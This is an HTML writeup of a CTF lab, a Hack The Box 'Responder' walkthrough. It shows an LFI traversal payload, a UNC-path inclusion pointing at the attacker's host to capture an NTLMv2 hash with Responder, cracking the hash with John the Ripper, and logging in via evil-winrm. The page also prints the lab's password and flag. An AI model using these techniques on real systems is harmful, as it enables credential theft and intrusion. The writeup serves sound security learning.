@@ -1,0 +1,301 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hack The Box Responder | frncscrlnd’s writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Hack The Box Responder" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Walkthorugh/Writeup for Responder, a Starting Point Hack The Box machine about responder, a tool made to capture NTLMv2 Challenge/Response" />
+<meta property="og:description" content="Walkthorugh/Writeup for Responder, a Starting Point Hack The Box machine about responder, a tool made to capture NTLMv2 Challenge/Response" />
+<link rel="canonical" href="http://localhost:4000/hackthebox/Responder" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/Responder" />
+<meta property="og:site_name" content="frncscrlnd’s writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box Responder" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Walkthorugh/Writeup for Responder, a Starting Point Hack The Box machine about responder, a tool made to capture NTLMv2 Challenge/Response","headline":"Hack The Box Responder","url":"http://localhost:4000/hackthebox/Responder"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=150d28b77225a4a207f11ff76d8d5a1e96152911">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$', '$$'], ['\\[', '\\]']]
+        },
+        svg: { fontCache: 'global' }
+      };
+    </script>
+    <script id="MathJax-script" async
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+    </script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>frncscrlnd's writeups</h1>
+          <p>Writeups from challenges and CTFs i take part in.</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/frncscrlnd">frncscrlnd</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="responder"><a href="https://app.hackthebox.com/machines/Responder">Responder</a><!-- omit in toc --></h1>
+
+<p>This Starting Point machine revolves entirely around <a href="https://github.com/SpiderLabs/Responder">responder</a>, a tool made to capture NTLMv2 Challenge/Response</p>
+
+<h3 id="table-of-contents">Table of contents:</h3>
+<ul>
+  <li><a href="#task-1">Task 1</a></li>
+  <li><a href="#task-2">Task 2</a></li>
+  <li><a href="#task-3">Task 3</a></li>
+  <li><a href="#task-4">Task 4</a></li>
+  <li><a href="#task-5">Task 5</a></li>
+  <li><a href="#task-6">Task 6</a></li>
+  <li><a href="#task-7">Task 7</a></li>
+  <li><a href="#task-8">Task 8</a></li>
+  <li><a href="#task-9">Task 9</a></li>
+  <li><a href="#task-10">Task 10</a></li>
+  <li><a href="#task-11">Task 11</a></li>
+  <li><a href="#submit-flag">Submit Flag</a></li>
+</ul>
+
+<h2 id="task-1">Task 1</h2>
+
+<p><em>When visiting the web service using the IP address, what is the domain that we are being redirected to?</em></p>
+
+<p>After pasting the machine’s IP address in the address bar, we get redirected to</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">unika.htb</code></p>
+</blockquote>
+
+<p>However, we can’t access the web page. This is because Hack The Box is probably using <a href="https://portswigger.net/web-security/host-header#:~:text=Virtual%20hosting">virtual hosting</a>. This means that the requested website changes based on the value of the <code class="language-plaintext highlighter-rouge">Host</code> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers">HTTP header</a>. We can change this value by adding the server’s IP address and domain name to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> like this: <code class="language-plaintext highlighter-rouge">sudo nano /etc/hosts</code> then paste <code class="language-plaintext highlighter-rouge">target-ip-here unika.htb</code> on a new line at the end of the file. <code class="language-plaintext highlighter-rouge">Ctrl+x</code> then <code class="language-plaintext highlighter-rouge">y</code> then press Enter. Now we can visit <code class="language-plaintext highlighter-rouge">unika.htb</code></p>
+
+<h2 id="task-2">Task 2</h2>
+
+<p><em>Which scripting language is being used on the server to generate webpages?</em></p>
+
+<p>To answer this question we need to run an in-depth <a href="https://nmap.org/">nmap</a> scan with the <a href="https://nmap.org/book/man-version-detection.html"><code class="language-plaintext highlighter-rouge">-sV</code></a> flag like this: <code class="language-plaintext highlighter-rouge">nmap target-ip-here -sV</code>. This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<p>This means that the Apache server serves</p>
+
+<blockquote>
+  <p>PHP</p>
+</blockquote>
+
+<p>code.</p>
+
+<h2 id="task-3">Task 3</h2>
+
+<p><em>What is the name of the URL parameter which is used to load different language versions of the webpage?</em></p>
+
+<p>We can answer this question simply by navigating the language options available in the website: <code class="language-plaintext highlighter-rouge">EN</code>, <code class="language-plaintext highlighter-rouge">FR</code>, <code class="language-plaintext highlighter-rouge">DE</code>
+Changing the language will display different endpoints in the address bar, such as <code class="language-plaintext highlighter-rouge">http://unika.htb/index.php?page=french.html</code>. This means that</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">page</code></p>
+</blockquote>
+
+<p>is the URL parameter used to load different lavguage versions of the webpage.</p>
+
+<h2 id="task-4">Task 4</h2>
+
+<p><em>Which of the following values for the <code class="language-plaintext highlighter-rouge">page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “<code class="language-plaintext highlighter-rouge">french.html</code>”, “<code class="language-plaintext highlighter-rouge">//10.10.14.6/somefile</code>”, “<code class="language-plaintext highlighter-rouge">../../../../../../../../windows/system32/drivers/etc/hosts</code>”, “<code class="language-plaintext highlighter-rouge">minikatz.exe</code>”</em></p>
+
+<p>Almost all of these values look legitimate: <code class="language-plaintext highlighter-rouge">french.html</code> is the actual value to get the french version of the webpage on this machine; <code class="language-plaintext highlighter-rouge">//10.10.14.6/somefile</code> is a request to an external resource; <code class="language-plaintext highlighter-rouge">minikatz.exe</code> is innocuous since you can not execute anything from the URL this way. This is also misspelled as it probably references the password exfiltration tool <a href="https://github.com/ParrotSec/mimikatz">Mimikatz</a>.</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">../../../../../../../../windows/system32/drivers/etc/hosts</code></p>
+</blockquote>
+
+<p>is, however, a clear <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability#:~:text=Local%20file%20inclusion,-%5Bedit">LFI</a> attempt as it tries to navigate the host’s file system back (<code class="language-plaintext highlighter-rouge">..</code>) to the root to the known WIndows file <code class="language-plaintext highlighter-rouge">hosts</code>, which holds domain name records, just like for <code class="language-plaintext highlighter-rouge">etc/hosts</code> on GNU/Linux distributions. Let’s try and submit this payload as the value to the <code class="language-plaintext highlighter-rouge">page</code> parameter: <code class="language-plaintext highlighter-rouge">http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</code></p>
+
+<p><img src="/assets/images/htb/responder/lfi.png" alt="LFI" /></p>
+
+<h2 id="task-5">Task 5</h2>
+
+<p><em>Which of the following values for the <code class="language-plaintext highlighter-rouge">page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “<code class="language-plaintext highlighter-rouge">french.html</code>”, “<code class="language-plaintext highlighter-rouge">//10.10.14.6/somefile</code>”, “<code class="language-plaintext highlighter-rouge">./../../../../../../../windows/system32/drivers/etc/hosts</code>”, “<code class="language-plaintext highlighter-rouge">mimikatz.exe</code>”</em></p>
+
+<p>As we saw in <a href="#task-4">Task 4</a>, <code class="language-plaintext highlighter-rouge">//10.10.14.6/somefile</code> is a request to an external resource. Specifically, this is an <a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths">UNC path</a>, a convention used to access network resources such as <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview">SMB</a> drives. In this case,</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">//10.10.14.6/somefile</code></p>
+</blockquote>
+
+<p>is a URL to a resource on an external machine, which could well be our machine, via UNC syntax (which only works on Windows machines).</p>
+
+<h2 id="task-6">Task 6</h2>
+
+<p><em>What does NTLM stand for?</em></p>
+
+<p>A simple web search will answer your question: “NT” stands for “New Technology” (lmao) and “NTLM” stands for “NT <a href="https://en.wikipedia.org/wiki/Local_area_network">LAN</a> Manager”. This means that what the acronym fully stands for is</p>
+
+<blockquote>
+  <p>New Technology LAN Manager</p>
+</blockquote>
+
+<p>which is an authentication protocol for Windows networks developed by Microsoft.</p>
+
+<h2 id="task-7">Task 7</h2>
+
+<p><em>Which flag do we use in the Responder utility to specify the network interface?</em></p>
+
+<p>The <a href="https://www.kali.org/tools/responder/">responder</a> utility is a tool made to capture authentication <a href="https://en.wikipedia.org/wiki/Hash_function">hashes</a> on a local network. NTLM uses a <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/identity-protection/windows-ntlm/">challenge-response mechanism</a> to authenticate users:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Client                          Server
+  |                               |
+  |------ NEGOTIATE (1) --------&gt; |   a hashed password is shared, plaintext password is deleted; 
+  |                               |
+  |&lt;----- CHALLENGE (2) --------- |   a 16-byte random number is shared;
+  |                               |
+  |------ AUTHENTICATE (3) -----&gt; |   the hashed password is used as cryptographic key to encrypt the number.
+</code></pre></div></div>
+
+<p>What we need to do is intercept the NetNTLMv2 chellenge/response (The <a href="https://en.wikipedia.org/wiki/NTLM#:~:text=C%29-,NTLMv2">NTLMv2</a> password hash) from the third stage with responder, but first we need to set it up.</p>
+
+<p>responder’s syntax is simple: as per the <a href="https://www.kali.org/tools/responder/">docs</a> you can use <code class="language-plaintext highlighter-rouge">-i</code> to specify the ip address and</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">-I</code></p>
+</blockquote>
+
+<p>to specify the interface. We are going to run</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo responder -I tun0
+</code></pre></div></div>
+
+<p>Then run <code class="language-plaintext highlighter-rouge">ifconfig</code> and see what’s the ip address of the <code class="language-plaintext highlighter-rouge">tun0</code> interface. Then append <code class="language-plaintext highlighter-rouge">//your-ip-here/somefile</code> like this: <code class="language-plaintext highlighter-rouge">http://unika.htb/index.php?page=//your-ip-here/somefile</code></p>
+
+<p>This will return this output on responder:</p>
+
+<p><img src="/assets/images/htb/responder/responder.png" alt="responder" /></p>
+
+<p>The NTLMv2 hash will be</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administrator::RESPONDER:17ade4fe50c7f8f5:61E94F5A7ED12D8E4538C7C3B4B8376C:010100000000000080018B8291CEDC013D1537269654AECA0000000002000800360034003900300001001E00570049004E002D0031005200430030005700380051005100450052005A0004003400570049004E002D0031005200430030005700380051005100450052005A002E0036003400390030002E004C004F00430041004C000300140036003400390030002E004C004F00430041004C000500140036003400390030002E004C004F00430041004C000700080080018B8291CEDC01060004000200000008003000300000000000000001000000002000007AD4336B44F239E11DC64AEFA53D35112E9A882E823806BBC4F22560AFFD32280A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340032000000000000000000
+</code></pre></div></div>
+
+<p>we can save this to a file either by <code class="language-plaintext highlighter-rouge">nano</code>ing and pasting the content into a new file (<code class="language-plaintext highlighter-rouge">nano hash.txt</code>) or by using <code class="language-plaintext highlighter-rouge">echo</code> (<code class="language-plaintext highlighter-rouge">echo hash-here &gt; hash.txt</code>)</p>
+
+<h2 id="task-8">Task 8</h2>
+
+<p><em>There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code class="language-plaintext highlighter-rouge">john</code>, but the full name is what?.</em></p>
+
+<p>One way to <code class="language-plaintext highlighter-rouge">crack</code> this hash is through a  <a href="https://en.wikipedia.org/wiki/Dictionary_attack">dictionary attack</a>. Some tools available in the field are <a href="https://hashcat.net/hashcat/"><code class="language-plaintext highlighter-rouge">hashcat</code></a> and <a href="https://www.openwall.com/john/"><code class="language-plaintext highlighter-rouge">john</code></a>. john’s full name is</p>
+
+<blockquote>
+  <p>John The Ripper</p>
+</blockquote>
+
+<h2 id="task-9">Task 9</h2>
+
+<p><em>What is the password for the administrator user?</em></p>
+
+<p>Let’s use john to crack the hash we got from responder:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john -w=/usr/share/wordlists/rockyou.txt  hash.txt 
+</code></pre></div></div>
+
+<p>this will return</p>
+
+<p><img src="/assets/images/htb/responder/john.png" alt="john" /></p>
+
+<p>That means that the password for the administrator user is</p>
+
+<blockquote>
+  <p>badminton</p>
+</blockquote>
+
+<h2 id="task-10">Task 10</h2>
+
+<p><em>We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</em></p>
+
+<p>Let’s go back to <a href="#task-2">Task 2</a> and our nmap scan:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</code></pre></div></div>
+
+<p>means that this service is listening on port</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">5985</code></p>
+</blockquote>
+
+<p><a href="https://learn.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management">WinRM</a> runs on this port.</p>
+
+<h2 id="task-11">Task 11</h2>
+
+<p><em>On which user’s desktop is the flag located?</em></p>
+
+<p>We now need to remotely access this machine. We’ll do so with <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i 10.129.98.102 -u administrator -p badminton
+</code></pre></div></div>
+
+<p>Now we’re in the target host. Let’s navigate directories (list directories with <code class="language-plaintext highlighter-rouge">dir</code> or <code class="language-plaintext highlighter-rouge">ls</code> and move through them with <code class="language-plaintext highlighter-rouge">cd</code>). While looking into rhe <code class="language-plaintext highlighter-rouge">/Users</code> folder, we notice that the only other user apart from <code class="language-plaintext highlighter-rouge">Administrator</code> is <code class="language-plaintext highlighter-rouge">mike</code>. After <code class="language-plaintext highlighter-rouge">cd</code>ing into <code class="language-plaintext highlighter-rouge">Desktop</code>, we come across a <code class="language-plaintext highlighter-rouge">flag.txt</code> file. This means that the flag is on</p>
+
+<blockquote>
+  <p>mike</p>
+</blockquote>
+
+<p>’s Desktop folder.</p>
+
+<h2 id="submit-flag">Submit Flag</h2>
+
+<p><em>Submit root flag</em></p>
+
+<p>Let’s read the flag with <code class="language-plaintext highlighter-rouge">cat flag.txt</code>:</p>
+
+<blockquote>
+  <p>ea81b7afddd03efaa0945333ed147fac</p>
+</blockquote>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
